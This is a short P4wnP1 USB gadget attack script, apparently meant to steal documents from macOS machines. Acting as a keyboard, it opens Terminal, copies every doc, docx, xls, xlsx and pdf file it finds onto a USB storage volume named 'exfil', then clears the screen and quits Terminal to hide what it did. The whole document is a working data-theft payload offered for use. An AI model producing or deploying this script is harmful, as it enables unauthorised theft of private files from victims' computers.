// Steal files from OSX
// You need to setup P4wnP1 USB Gadget Settings as HID keyboard and Mass storage
// Create storage using genimg: "/usr/local/P4wnP1/helper/genimg -i -s 500 -o 500mb -l exfil"


layout("us");
delay(500)
press("GUI SPACE") 
delay(250) 
type("terminal")
delay(250)
press("ENTER") 
delay(500)

var filetypes = ["doc", "docx", "xls", "xlsx", "pdf"]
for (var i = 0; i < filetypes.length; i++) {
	type("find . -name '*." + filetypes[i] + "' -exec cp '{}' /Volumes/exfil/ \\;\n")
	type("clear\n")

}

delay(10000)
type("clear\n")
delay(500)
type("exit\n")
delay(500)
press("GUI Q")


